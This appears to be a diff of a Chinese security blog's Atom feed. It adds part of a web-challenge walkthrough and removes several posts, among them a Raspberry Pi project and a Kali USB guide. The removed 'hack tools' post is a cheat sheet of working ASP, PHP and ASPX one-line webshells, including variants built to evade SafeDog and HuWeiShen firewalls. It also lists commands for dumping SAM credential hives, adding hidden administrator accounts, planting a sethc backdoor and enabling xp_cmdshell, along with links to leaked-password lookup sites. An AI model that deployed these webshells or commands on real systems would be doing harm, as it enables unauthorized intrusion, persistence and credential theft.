+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/rocketscript"</span> <span class="attr">data-rocketoptimized</span>=<span class="string">"true"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="built_in">document</span>.oncontextmenu=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;;</div><div class="line"></div><div class="line">    <span class="keyword">var</span> a,b,c,d,e,f,g;</div><div class="line">    a = <span class="number">3.14</span>;</div><div class="line">    b = a * <span class="number">2</span>;</div><div class="line">    c = a + b;</div><div class="line">    d = c / b + a;</div><div class="line">    e = c - d * b + a;</div><div class="line">    f = e + d /c -b * a;</div><div class="line">    g = f * e - d + c * b + a;</div><div class="line">    a = g * g;</div><div class="line">    a = <span class="built_in">Math</span>.floor(a);</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">"txt"</span>).value==a)&#123;</div><div class="line">            <span class="built_in">window</span>.location.href=a + <span class="string">".php"</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            alert(<span class="string">"密码错误"</span>);</div><div class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
 <p>现在是2016年了，我们不需要手算和计算器了。直接在chrome的console里输入<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a,b,c,d,e,f,g;</div><div class="line">    a = <span class="number">3.14</span>;</div><div class="line">    b = a * <span class="number">2</span>;</div><div class="line">    c = a + b;</div><div class="line">    d = c / b + a;</div><div class="line">    e = c - d * b + a;</div><div class="line">    f = e + d /c -b * a;</div><div class="line">    g = f * e - d + c * b + a;</div><div class="line">    a = g * g;</div><div class="line">    a = <span class="built_in">Math</span>.floor(a);</div><div class="line">    </div><div class="line"><span class="number">424178</span></div></pre></td></tr></table></figure></p>
 <p>好的我们知道a的值是424178，输入，进入下一关</p>
 <h1 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h1><p><a href="http://monyer.com/game/game1/424178.php" target="_blank" rel="external">http://monyer.com/game/game1/424178.php</a></p>
@@ -891,127 +1092,6 @@
     
     
       <category term="Web" scheme="http://blog.yfgeek.com/tags/Web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>那些Hack神器及奇技淫巧</title>
-    <link href="http://blog.yfgeek.com/2016/09/11/hacktool/"/>
-    <id>http://blog.yfgeek.com/2016/09/11/hacktool/</id>
-    <published>2016-09-11T22:07:28.000Z</published>
-    <updated>2016-11-19T11:35:18.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。</p>
-<h1 id="那些网站"><a href="#那些网站" class="headerlink" title="那些网站"></a>那些网站</h1><h2 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h2><h3 id="国内"><a href="#国内" class="headerlink" title="国内"></a>国内</h3><p><a href="http://www.findmima.com/" target="_blank" rel="external">http://www.findmima.com/</a></p>
-<p><a href="http://www.wghostk.com/so/" target="_blank" rel="external">http://www.wghostk.com/so/</a></p>
-<p><a href="http://p.08lt.com" target="_blank" rel="external">http://p.08lt.com</a></p>
-<p><a href="http://www.144118.com/" target="_blank" rel="external">http://www.144118.com/</a></p>
-<h3 id="国际"><a href="#国际" class="headerlink" title="国际"></a>国际</h3><p><a href="https://haveibeenpwned.com/" target="_blank" rel="external">https://haveibeenpwned.com/</a></p>
-<p><a href="https://leakbase.pw/" target="_blank" rel="external">https://leakbase.pw/</a></p>
-<h2 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h2><p><a href="http://www.144118.com/" target="_blank" rel="external">http://www.144118.com/</a></p>
-<h2 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h2><p><a href="http://whois.domaintools.com/" target="_blank" rel="external">http://whois.domaintools.com/</a></p>
-<h2 id="历史页面"><a href="#历史页面" class="headerlink" title="历史页面"></a>历史页面</h2><h1 id="那些实用命令"><a href="#那些实用命令" class="headerlink" title="那些实用命令"></a>那些实用命令</h1><h2 id="reg导出sam"><a href="#reg导出sam" class="headerlink" title="reg导出sam"></a>reg导出sam</h2><p>reg save hklm\sam sam.hive</p>
-<p>reg save hklm\system system.hive</p>
-<p>reg save hklm\security security.hive</p>
-<h2 id="Windows新建用户"><a href="#Windows新建用户" class="headerlink" title="Windows新建用户"></a>Windows新建用户</h2><p>net user admin$ admin /add</p>
-<p>net localgroup administrators admin$ /add</p>
-<p>net user Guest 1234</p>
-<p>net user Guest /active:yes</p>
-<p>net localgroup administrators Guest /add</p>
-<h2 id="打开3389-2003-xp"><a href="#打开3389-2003-xp" class="headerlink" title="打开3389(2003,xp)"></a>打开3389(2003,xp)</h2><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>
-<h2 id="sethc后门"><a href="#sethc后门" class="headerlink" title="sethc后门"></a>sethc后门</h2><p>Copy C:\windows\explorer.exe C:\Windows\System32\sethc.exe /y</p>
-<h2 id="mssql-xpcmdshell报错"><a href="#mssql-xpcmdshell报错" class="headerlink" title="mssql xpcmdshell报错"></a>mssql xpcmdshell报错</h2><p>EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE;</p>
-<h1 id="那些一句话"><a href="#那些一句话" class="headerlink" title="那些一句话"></a>那些一句话</h1><h2 id="asp一句话木马"><a href="#asp一句话木马" class="headerlink" title="asp一句话木马"></a>asp一句话木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%eval request(&quot;x&quot;)%&gt;</div></pre></td></tr></table></figure>
-<h2 id="php一句话木马"><a href="#php一句话木马" class="headerlink" title="php一句话木马"></a>php一句话木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php eval($_POST[g]);?&gt;</div></pre></td></tr></table></figure>
-<h2 id="aspx一句话"><a href="#aspx一句话" class="headerlink" title="aspx一句话"></a>aspx一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;x&quot;],&quot;unsafe&quot;);%&gt;</div></pre></td></tr></table></figure>
-<h2 id="数据库加密一句话-密码a"><a href="#数据库加密一句话-密码a" class="headerlink" title="数据库加密一句话(密码a)"></a>数据库加密一句话(密码a)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">┼攠數畣整爠煥敵瑳∨≡┩愾</div></pre></td></tr></table></figure>
-<h2 id="网站配置、版权信息专用一句话"><a href="#网站配置、版权信息专用一句话" class="headerlink" title="网站配置、版权信息专用一句话"></a>网站配置、版权信息专用一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;%&gt;&lt;%Eval Request(x)%&gt;</div></pre></td></tr></table></figure>
-<h2 id="一句话再过护卫神"><a href="#一句话再过护卫神" class="headerlink" title="一句话再过护卫神"></a>一句话再过护卫神</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%execute(Y)%&gt;</div></pre></td></tr></table></figure>
-<h2 id="过拦截一句话木马"><a href="#过拦截一句话木马" class="headerlink" title="过拦截一句话木马"></a>过拦截一句话木马</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;% eXEcGlOBaL ReQuEsT(&quot;x&quot;) %&gt;</div></pre></td></tr></table></figure>
-<h2 id="asp闭合型一句话"><a href="#asp闭合型一句话" class="headerlink" title="asp闭合型一句话"></a>asp闭合型一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&gt;&lt;%eval request(&quot;0o1Znz1ow&quot;)%&gt;&lt;%</div></pre></td></tr></table></figure>
-<h2 id="能过安全狗的解析格式"><a href="#能过安全狗的解析格式" class="headerlink" title="能过安全狗的解析格式"></a>能过安全狗的解析格式</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">;hfdjf.;dfd.;dfdfdfd.asp;sdsd.jpg</div></pre></td></tr></table></figure>
-<h2 id="突破安全狗的一句话"><a href="#突破安全狗的一句话" class="headerlink" title="突破安全狗的一句话"></a>突破安全狗的一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%Y=request(&quot;x&quot;)%&gt; &lt;%eval(Y)%&gt;</div></pre></td></tr></table></figure>
-<h2 id="elong过安全狗的php一句话"><a href="#elong过安全狗的php一句话" class="headerlink" title="elong过安全狗的php一句话"></a>elong过安全狗的php一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php  $a = &quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;;  $a($_POST[cc]);  ?&gt;</div></pre></td></tr></table></figure>
-<h2 id="后台常用写入php一句话（密码x）"><a href="#后台常用写入php一句话（密码x）" class="headerlink" title="后台常用写入php一句话（密码x）"></a>后台常用写入php一句话（密码x）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;? </div><div class="line"> $fp = @fopen(&quot;c.php&quot;, &apos;a&apos;); </div><div class="line"> @fwrite($fp, &apos;&lt;&apos;.&apos;?php&apos;.&quot;\r\n\r\n&quot;.&apos;eval($_POST[x])&apos;.&quot;\r\n\r\n?&quot;.&quot;&gt;\r\n&quot;); </div><div class="line"> @fclose($fp); </div><div class="line"> ?&gt;</div></pre></td></tr></table></figure>
-<h2 id="高强度php一句话"><a href="#高强度php一句话" class="headerlink" title="高强度php一句话"></a>高强度php一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php substr(md5($_REQUEST[&apos;heroes&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
-<h2 id="新型变异PHP一句话-密码b4dboy"><a href="#新型变异PHP一句话-密码b4dboy" class="headerlink" title="新型变异PHP一句话(密码b4dboy)"></a>新型变异PHP一句话(密码b4dboy)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">($b4dboy = $_POST[&apos;b4dboy&apos;]) &amp;&amp; @preg_replace(‘/ad/e’,’@’.str_rot13(‘riny’).’($b4dboy)’, ‘add’);</div></pre></td></tr></table></figure>
-<h2 id="突破安全狗的aspx一句话"><a href="#突破安全狗的aspx一句话" class="headerlink" title="突破安全狗的aspx一句话"></a>突破安全狗的aspx一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=&quot;C#&quot; ValidateRequest=&quot;false&quot; %&gt;</div><div class="line">&lt;%try&#123; System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cookies[&quot;你的密码&quot;].Value))).CreateInstance(&quot;c&quot;, true, System.Reflection.BindingFlags.Default, null, new object[] &#123; this &#125;, null, null); &#125; catch &#123; &#125;%&gt;</div></pre></td></tr></table></figure>
-<h2 id="突破护卫神，保护盾一句话"><a href="#突破护卫神，保护盾一句话" class="headerlink" title="突破护卫神，保护盾一句话"></a>突破护卫神，保护盾一句话</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php $a = str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);</div><div class="line">$a($_POST[&quot;test&quot;]); ?&gt;</div></pre></td></tr></table></figure>
-<h2 id="PHP高强度一句话："><a href="#PHP高强度一句话：" class="headerlink" title="PHP高强度一句话："></a>PHP高强度一句话：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php substr(md5($_REQUEST[&apos;x&apos;]),28)==&apos;acd0&apos;&amp;&amp;eval($_REQUEST[&apos;c&apos;]);?&gt;</div></pre></td></tr></table></figure>
-<p>菜刀连接：<code>/x.php?x=lostwolf</code>  脚本类型：php  密码：c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php assert($_REQUEST[&quot;c&quot;]);?&gt;</div></pre></td></tr></table></figure></p>
-<h2 id="aspx过狗"><a href="#aspx过狗" class="headerlink" title="aspx过狗"></a>aspx过狗</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%var name:String=Request.Item[&quot;cmd&quot;];Response.Write(eval(name,&quot;unsafe&quot;));%&gt;</div></pre></td></tr></table></figure>
-<h1 id="那些神器"><a href="#那些神器" class="headerlink" title="那些神器"></a>那些神器</h1><ul>
-<li>Sqlmap</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;这里会总结一些Hack经验，都是我日常使用的，会长期更新，渗透测试专用，请勿挪作非法用途。&lt;/p&gt;
-&lt;h1 id=&quot;那些网站&quot;&gt;&lt;a hre
-    
-    </summary>
-    
-      <category term="Hack" scheme="http://blog.yfgeek.com/categories/Hack/"/>
-    
-    
-      <category term="Hack" scheme="http://blog.yfgeek.com/tags/Hack/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>树莓派实时温度湿度监测进阶</title>
-    <link href="http://blog.yfgeek.com/2016/08/26/runtimelcd/"/>
-    <id>http://blog.yfgeek.com/2016/08/26/runtimelcd/</id>
-    <published>2016-08-26T14:19:14.000Z</published>
-    <updated>2016-11-19T11:35:18.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。</p>
-<h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><ul>
-<li>Adafruit_DHT</li>
-<li>Adafruit_CharLCD</li>
-<li>Nginx/Apache (请自行提前安装)</li>
-</ul>
-<h1 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install build-essential python-dev python-smbus python-pip</div><div class="line">git <span class="built_in">clone</span> https://github.com/adafruit/Adafruit_Python_DHT.git</div><div class="line"><span class="built_in">cd</span> Adafruit_Python_DHT</div><div class="line">sudo python setup.py install</div><div class="line">sudo pip install RPi.GPIO</div><div class="line">git <span class="built_in">clone</span> https://github.com/adafruit/Adafruit_Python_CharLCD</div><div class="line"><span class="built_in">cd</span> Adafruit_Python_CharLCD</div><div class="line">sudo python setup.py install</div></pre></td></tr></table></figure>
-<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /var/www/html</div><div class="line">git <span class="built_in">clone</span>  https://github.com/yfgeek/rpi-TempRuntime.git</div></pre></td></tr></table></figure>
-<h1 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> /var/www/html/rpi-TempRuntime</div><div class="line">python LCD.py</div></pre></td></tr></table></figure>
-<h1 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h1><p><img src="/content/images/2016/08/WechatIMG10.jpeg" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。&lt;/p&gt;
-&lt;h1 id=&quot;依赖&quot;&gt;&lt;a href=&quot;#依赖&quot; class=&quot;headerlink&quot; title=&quot;依赖&quot;&gt;&lt;/a&gt;依赖&lt;/h1&gt;&lt;ul&gt;
-&lt;li&gt;Adafruit_DHT&lt;
-    
-    </summary>
-    
-    
-      <category term="Raspberry" scheme="http://blog.yfgeek.com/tags/Raspberry/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>把KALI放到U盘里</title>
-    <link href="http://blog.yfgeek.com/2016/08/25/ba-kalifang-dao-upan-li/"/>
-    <id>http://blog.yfgeek.com/2016/08/25/ba-kalifang-dao-upan-li/</id>
-    <published>2016-08-25T18:26:45.000Z</published>
-    <updated>2016-08-25T18:29:38.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>步骤1：进入 bios设置U盘启动，保存并启动电脑</p>
-<p>步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。<br><a id="more"></a><br>步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。</p>
-<p>关掉gparted ，在命令行里输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir /mnt/usb</div><div class="line">mount /dev/sdb2 /mnt/usb</div><div class="line"><span class="built_in">echo</span> <span class="string">"/ union"</span> &gt;&gt; /mnt/usb/persistence.conf</div><div class="line">umount /mnt/usb</div></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;步骤1：进入 bios设置U盘启动，保存并启动电脑&lt;/p&gt;
-&lt;p&gt;步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="Linux" scheme="http://blog.yfgeek.com/tags/Linux/"/>
     
   </entry>
   
